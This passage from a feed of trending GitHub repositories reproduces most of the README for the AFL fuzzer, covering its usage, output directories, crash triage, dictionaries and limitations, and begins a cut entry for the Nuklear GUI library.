&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;$ &lt;span class="pl-c1"&gt;cd&lt;/span&gt; qemu_mode
$ ./build_qemu_support.sh&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For additional instructions and caveats, see qemu_mode/README.qemu.&lt;/p&gt;
&lt;p&gt;The mode is approximately 2-5x slower than compile-time instrumentation, is
less conducive to parallelization, and may have some other quirks.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-5-choosing-initial-test-cases" class="anchor" aria-hidden="true" href="#5-choosing-initial-test-cases"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;5) Choosing initial test cases&lt;/h2&gt;
&lt;p&gt;To operate correctly, the fuzzer requires one or more starting file that
contains a good example of the input data normally expected by the targeted
application. There are two basic rules:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Keep the files small. Under 1 kB is ideal, although not strictly necessary.
For a discussion of why size matters, see &lt;a href="docs/perf_tips.txt"&gt;perf_tips.txt&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use multiple test cases only if they are functionally different from
each other. There is no point in using fifty different vacation photos
to fuzz an image library.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can find many good examples of starting files in the testcases/ subdirectory
that comes with this tool.&lt;/p&gt;
&lt;p&gt;PS. If a large corpus of data is available for screening, you may want to use
the afl-cmin utility to identify a subset of functionally distinct files that
exercise different code paths in the target binary.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-6-fuzzing-binaries" class="anchor" aria-hidden="true" href="#6-fuzzing-binaries"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;6) Fuzzing binaries&lt;/h2&gt;
&lt;p&gt;The fuzzing process itself is carried out by the afl-fuzz utility. This program
requires a read-only directory with initial test cases, a separate place to
store its findings, plus a path to the binary to test.&lt;/p&gt;
&lt;p&gt;For target binaries that accept input directly from stdin, the usual syntax is:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program [...params...]&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For programs that take input from a file, use '@@' to mark the location in
the target's command line where the input file name should be placed. The
fuzzer will substitute this for you:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can also use the -f option to have the mutated data written to a specific
file. This is useful if the program expects a particular file extension or so.&lt;/p&gt;
&lt;p&gt;Non-instrumented binaries can be fuzzed in the QEMU mode (add -Q in the command
line) or in a traditional, blind-fuzzer mode (specify -n).&lt;/p&gt;
&lt;p&gt;You can use -t and -m to override the default timeout and memory limit for the
executed process; rare examples of targets that may need these settings touched
include compilers and video decoders.&lt;/p&gt;
&lt;p&gt;Tips for optimizing fuzzing performance are discussed in &lt;a href="docs/perf_tips.txt"&gt;perf_tips.txt&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Note that afl-fuzz starts by performing an array of deterministic fuzzing
steps, which can take several days, but tend to produce neat test cases. If you
want quick &amp;amp; dirty results right away - akin to zzuf and other traditional
fuzzers - add the -d option to the command line.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-7-interpreting-output" class="anchor" aria-hidden="true" href="#7-interpreting-output"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;7) Interpreting output&lt;/h2&gt;
&lt;p&gt;See the &lt;a href="docs/status_screen.txt"&gt;status_screen.txt&lt;/a&gt; file for information on
how to interpret the displayed stats and monitor the health of the process.
Be sure to consult this file especially if any UI elements are highlighted in
red.&lt;/p&gt;
&lt;p&gt;The fuzzing process will continue until you press Ctrl-C. At minimum, you want
to allow the fuzzer to complete one queue cycle, which may take anywhere from a
couple of hours to a week or so.&lt;/p&gt;
&lt;p&gt;There are three subdirectories created within the output directory and updated
in real time:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;queue/   - test cases for every distinctive execution path, plus all the
starting files given by the user. This is the synthesized corpus
mentioned in section 2.
Before using this corpus for any other purposes, you can shrink
it to a smaller size using the afl-cmin tool. The tool will find
a smaller subset of files offering equivalent edge coverage.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;crashes/ - unique test cases that cause the tested program to receive a
fatal signal (e.g., SIGSEGV, SIGILL, SIGABRT). The entries are
grouped by the received signal.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;hangs/   - unique test cases that cause the tested program to time out. The
default time limit before something is classified as a hang is
the larger of 1 second and the value of the -t parameter.
The value can be fine-tuned by setting AFL_HANG_TMOUT, but this
is rarely necessary.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Crashes and hangs are considered "unique" if the associated execution paths
involve any state transitions not seen in previously-recorded faults. If a
single bug can be reached in multiple ways, there will be some count inflation
early in the process, but this should quickly taper off.&lt;/p&gt;
&lt;p&gt;The file names for crashes and hangs are correlated with parent, non-faulting
queue entries. This should help with debugging.&lt;/p&gt;
&lt;p&gt;When you can't reproduce a crash found by afl-fuzz, the most likely cause is
that you are not setting the same memory limit as used by the tool. Try:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;$ LIMIT_MB=50
$ ( &lt;span class="pl-c1"&gt;ulimit&lt;/span&gt; -Sv $[LIMIT_MB &lt;span class="pl-k"&gt;&amp;lt;&amp;lt;&lt;/span&gt; 10]&lt;span class="pl-k"&gt;;&lt;/span&gt; /path/to/tested_binary ... )&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Change LIMIT_MB to match the -m parameter passed to afl-fuzz. On OpenBSD,
also change -Sv to -Sd.&lt;/p&gt;
&lt;p&gt;Any existing output directory can be also used to resume aborted jobs; try:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;$ ./afl-fuzz -i- -o existing_output_dir [...etc...]&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you have gnuplot installed, you can also generate some pretty graphs for any
active fuzzing task using afl-plot. For an example of how this looks like,
see &lt;a href="http://lcamtuf.coredump.cx/afl/plot/" rel="nofollow"&gt;http://lcamtuf.coredump.cx/afl/plot/&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-8-parallelized-fuzzing" class="anchor" aria-hidden="true" href="#8-parallelized-fuzzing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;8) Parallelized fuzzing&lt;/h2&gt;
&lt;p&gt;Every instance of afl-fuzz takes up roughly one core. This means that on
multi-core systems, parallelization is necessary to fully utilize the hardware.
For tips on how to fuzz a common target on multiple cores or multiple networked
machines, please refer to &lt;a href="docs/parallel_fuzzing.txt"&gt;parallel_fuzzing.txt&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The parallel fuzzing mode also offers a simple way for interfacing AFL to other
fuzzers, to symbolic or concolic execution engines, and so forth; again, see the
last section of &lt;a href="docs/parallel_fuzzing.txt"&gt;parallel_fuzzing.txt&lt;/a&gt; for tips.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-9-fuzzer-dictionaries" class="anchor" aria-hidden="true" href="#9-fuzzer-dictionaries"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;9) Fuzzer dictionaries&lt;/h2&gt;
&lt;p&gt;By default, afl-fuzz mutation engine is optimized for compact data formats -
say, images, multimedia, compressed data, regular expression syntax, or shell
scripts. It is somewhat less suited for languages with particularly verbose and
redundant verbiage - notably including HTML, SQL, or JavaScript.&lt;/p&gt;
&lt;p&gt;To avoid the hassle of building syntax-aware tools, afl-fuzz provides a way to
seed the fuzzing process with an optional dictionary of language keywords,
magic headers, or other special tokens associated with the targeted data type
-- and use that to reconstruct the underlying grammar on the go:&lt;/p&gt;
&lt;p&gt;&lt;a href="http://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html" rel="nofollow"&gt;http://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;To use this feature, you first need to create a dictionary in one of the two
formats discussed in dictionaries/README.dictionaries; and then point the fuzzer
to it via the -x option in the command line.&lt;/p&gt;
&lt;p&gt;(Several common dictionaries are already provided in that subdirectory, too.)&lt;/p&gt;
&lt;p&gt;There is no way to provide more structured descriptions of the underlying
syntax, but the fuzzer will likely figure out some of this based on the
instrumentation feedback alone. This actually works in practice, say:&lt;/p&gt;
&lt;p&gt;&lt;a href="http://lcamtuf.blogspot.com/2015/04/finding-bugs-in-sqlite-easy-way.html" rel="nofollow"&gt;http://lcamtuf.blogspot.com/2015/04/finding-bugs-in-sqlite-easy-way.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;PS. Even when no explicit dictionary is given, afl-fuzz will try to extract
existing syntax tokens in the input corpus by watching the instrumentation
very closely during deterministic byte flips. This works for some types of
parsers and grammars, but isn't nearly as good as the -x mode.&lt;/p&gt;
&lt;p&gt;If a dictionary is really hard to come by, another option is to let AFL run
for a while, and then use the token capture library that comes as a companion
utility with AFL. For that, see libtokencap/README.tokencap.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-10-crash-triage" class="anchor" aria-hidden="true" href="#10-crash-triage"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;10) Crash triage&lt;/h2&gt;
&lt;p&gt;The coverage-based grouping of crashes usually produces a small data set that
can be quickly triaged manually or with a very simple GDB or Valgrind script.
Every crash is also traceable to its parent non-crashing test case in the
queue, making it easier to diagnose faults.&lt;/p&gt;
&lt;p&gt;Having said that, it's important to acknowledge that some fuzzing crashes can be
difficult to quickly evaluate for exploitability without a lot of debugging and
code analysis work. To assist with this task, afl-fuzz supports a very unique
"crash exploration" mode enabled with the -C flag.&lt;/p&gt;
&lt;p&gt;In this mode, the fuzzer takes one or more crashing test cases as the input,
and uses its feedback-driven fuzzing strategies to very quickly enumerate all
code paths that can be reached in the program while keeping it in the
crashing state.&lt;/p&gt;
&lt;p&gt;Mutations that do not result in a crash are rejected; so are any changes that
do not affect the execution path.&lt;/p&gt;
&lt;p&gt;The output is a small corpus of files that can be very rapidly examined to see
what degree of control the attacker has over the faulting address, or whether
it is possible to get past an initial out-of-bounds read - and see what lies
beneath.&lt;/p&gt;
&lt;p&gt;Oh, one more thing: for test case minimization, give afl-tmin a try. The tool
can be operated in a very simple way:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;$ ./afl-tmin -i test_case -o minimized_result -- /path/to/program [...]&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The tool works with crashing and non-crashing test cases alike. In the crash
mode, it will happily accept instrumented and non-instrumented binaries. In the
non-crashing mode, the minimizer relies on standard AFL instrumentation to make
the file simpler without altering the execution path.&lt;/p&gt;
&lt;p&gt;The minimizer accepts the -m, -t, -f and @@ syntax in a manner compatible with
afl-fuzz.&lt;/p&gt;
&lt;p&gt;Another recent addition to AFL is the afl-analyze tool. It takes an input
file, attempts to sequentially flip bytes, and observes the behavior of the
tested program. It then color-codes the input based on which sections appear to
be critical, and which are not; while not bulletproof, it can often offer quick
insights into complex file formats. More info about its operation can be found
near the end of &lt;a href="docs/technical_details.txt"&gt;technical_details.txt&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-11-going-beyond-crashes" class="anchor" aria-hidden="true" href="#11-going-beyond-crashes"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;11) Going beyond crashes&lt;/h2&gt;
&lt;p&gt;Fuzzing is a wonderful and underutilized technique for discovering non-crashing
design and implementation errors, too. Quite a few interesting bugs have been
found by modifying the target programs to call abort() when, say:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Two bignum libraries produce different outputs when given the same
fuzzer-generated input,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;An image library produces different outputs when asked to decode the same
input image several times in a row,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;A serialization / deserialization library fails to produce stable outputs
when iteratively serializing and deserializing fuzzer-supplied data,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;A compression library produces an output inconsistent with the input file
when asked to compress and then decompress a particular blob.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Implementing these or similar sanity checks usually takes very little time;
if you are the maintainer of a particular package, you can make this code
conditional with &lt;code&gt;#ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION&lt;/code&gt; (a flag also
shared with libfuzzer) or &lt;code&gt;#ifdef __AFL_COMPILER&lt;/code&gt; (this one is just for AFL).&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-12-common-sense-risks" class="anchor" aria-hidden="true" href="#12-common-sense-risks"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;12) Common-sense risks&lt;/h2&gt;
&lt;p&gt;Please keep in mind that, similarly to many other computationally-intensive
tasks, fuzzing may put strain on your hardware and on the OS. In particular:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Your CPU will run hot and will need adequate cooling. In most cases, if
cooling is insufficient or stops working properly, CPU speeds will be
automatically throttled. That said, especially when fuzzing on less
suitable hardware (laptops, smartphones, etc), it's not entirely impossible
for something to blow up.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Targeted programs may end up erratically grabbing gigabytes of memory or
filling up disk space with junk files. AFL tries to enforce basic memory
limits, but can't prevent each and every possible mishap. The bottom line
is that you shouldn't be fuzzing on systems where the prospect of data loss
is not an acceptable risk.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Fuzzing involves billions of reads and writes to the filesystem. On modern
systems, this will be usually heavily cached, resulting in fairly modest
"physical" I/O - but there are many factors that may alter this equation.
It is your responsibility to monitor for potential trouble; with very heavy
I/O, the lifespan of many HDDs and SSDs may be reduced.&lt;/p&gt;
&lt;p&gt;A good way to monitor disk I/O on Linux is the 'iostat' command:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;    $ iostat -d 3 -x -k [...optional disk ID...]&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;a id="user-content-13-known-limitations--areas-for-improvement" class="anchor" aria-hidden="true" href="#13-known-limitations--areas-for-improvement"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;13) Known limitations &amp;amp; areas for improvement&lt;/h2&gt;
&lt;p&gt;Here are some of the most important caveats for AFL:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;AFL detects faults by checking for the first spawned process dying due to
a signal (SIGSEGV, SIGABRT, etc). Programs that install custom handlers for
these signals may need to have the relevant code commented out. In the same
vein, faults in child processed spawned by the fuzzed target may evade
detection unless you manually add some code to catch that.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;As with any other brute-force tool, the fuzzer offers limited coverage if
encryption, checksums, cryptographic signatures, or compression are used to
wholly wrap the actual data format to be tested.&lt;/p&gt;
&lt;p&gt;To work around this, you can comment out the relevant checks (see
experimental/libpng_no_checksum/ for inspiration); if this is not possible,
you can also write a postprocessor, as explained in
experimental/post_library/.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;There are some unfortunate trade-offs with ASAN and 64-bit binaries. This
isn't due to any specific fault of afl-fuzz; see &lt;a href="docs/notes_for_asan.txt"&gt;notes_for_asan.txt&lt;/a&gt;
for tips.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;There is no direct support for fuzzing network services, background
daemons, or interactive apps that require UI interaction to work. You may
need to make simple code changes to make them behave in a more traditional
way. Preeny may offer a relatively simple option, too - see:
&lt;a href="https://github.com/zardus/preeny"&gt;https://github.com/zardus/preeny&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Some useful tips for modifying network-based services can be also found at:
&lt;a href="https://www.fastly.com/blog/how-to-fuzz-server-american-fuzzy-lop" rel="nofollow"&gt;https://www.fastly.com/blog/how-to-fuzz-server-american-fuzzy-lop&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;AFL doesn't output human-readable coverage data. If you want to monitor
coverage, use afl-cov from Michael Rash: &lt;a href="https://github.com/mrash/afl-cov"&gt;https://github.com/mrash/afl-cov&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Occasionally, sentient machines rise against their creators. If this
happens to you, please consult &lt;a href="http://lcamtuf.coredump.cx/prep/" rel="nofollow"&gt;http://lcamtuf.coredump.cx/prep/&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Beyond this, see INSTALL for platform-specific tips.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-14-special-thanks" class="anchor" aria-hidden="true" href="#14-special-thanks"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;14) Special thanks&lt;/h2&gt;
&lt;p&gt;Many of the improvements to afl-fuzz wouldn't be possible without feedback,
bug reports, or patches from:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  Jann Horn                             Hanno Boeck
  Felix Groebert                        Jakub Wilk
  Richard W. M. Jones                   Alexander Cherepanov
  Tom Ritter                            Hovik Manucharyan
  Sebastian Roschke                     Eberhard Mattes
  Padraig Brady                         Ben Laurie
  @dronesec                             Luca Barbato
  Tobias Ospelt                         Thomas Jarosch
  Martin Carpenter                      Mudge Zatko
  Joe Zbiciak                           Ryan Govostes
  Michael Rash                          William Robinet
  Jonathan Gray                         Filipe Cabecinhas
  Nico Weber                            Jodie Cunningham
  Andrew Griffiths                      Parker Thompson
  Jonathan Neuschfer                    Tyler Nighswander
  Ben Nagy                              Samir Aguiar
  Aidan Thornton                        Aleksandar Nikolich
  Sam Hakim                             Laszlo Szekeres
  David A. Wheeler                      Turo Lamminen
  Andreas Stieger                       Richard Godbee
  Louis Dassy                           teor2345
  Alex Moneger                          Dmitry Vyukov
  Keegan McAllister                     Kostya Serebryany
  Richo Healey                          Martijn Bogaard
  rc0r                                  Jonathan Foote
  Christian Holler                      Dominique Pelle
  Jacek Wielemborek                     Leo Barnes
  Jeremy Barnes                         Jeff Trull
  Guillaume Endignoux                   ilovezfs
  Daniel Godas-Lopez                    Franjo Ivancic
  Austin Seipp                          Daniel Komaromy
  Daniel Binderman                      Jonathan Metzman
  Vegard Nossum                         Jan Kneschke
  Kurt Roeckx                           Marcel Bohme
  Van-Thuan Pham                        Abhik Roychoudhury
  Joshua J. Drake                       Toby Hutton
  Rene Freingruber                      Sergey Davidoff
  Sami Liedes                           Craig Young
  Andrzej Jackowski                     Daniel Hodson
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Thank you!&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-15-contact" class="anchor" aria-hidden="true" href="#15-contact"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;15) Contact&lt;/h2&gt;
&lt;p&gt;Questions? Concerns? Bug reports? Please use GitHub.&lt;/p&gt;
&lt;p&gt;There is also a mailing list for the project; to join, send a mail to
&lt;a href="mailto:afl-users+subscribe@googlegroups.com"&gt;afl-users+subscribe@googlegroups.com&lt;/a&gt;. Or, if you prefer to browse
archives first, try: &lt;a href="https://groups.google.com/group/afl-users" rel="nofollow"&gt;https://groups.google.com/group/afl-users&lt;/a&gt;.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>google</author><guid isPermaLink="false">https://github.com/google/AFL</guid><pubDate>Tue, 04 Feb 2020 00:05:00 GMT</pubDate></item><item><title>Immediate-Mode-UI/Nuklear #6 in C, This week</title><link>https://github.com/Immediate-Mode-UI/Nuklear</link><description>&lt;p&gt;&lt;i&gt;A single-header ANSI C immediate mode cross-platform GUI library&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="Readme.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-nuklear" class="anchor" aria-hidden="true" href="#nuklear"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Nuklear&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/Immediate-Mode-UI/Nuklear/actions"&gt;&lt;img src="https://github.com/Immediate-Mode-UI/Nuklear/workflows/C%2FC++%20CI/badge.svg" alt="" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This is a minimal-state, immediate-mode graphical user interface toolkit
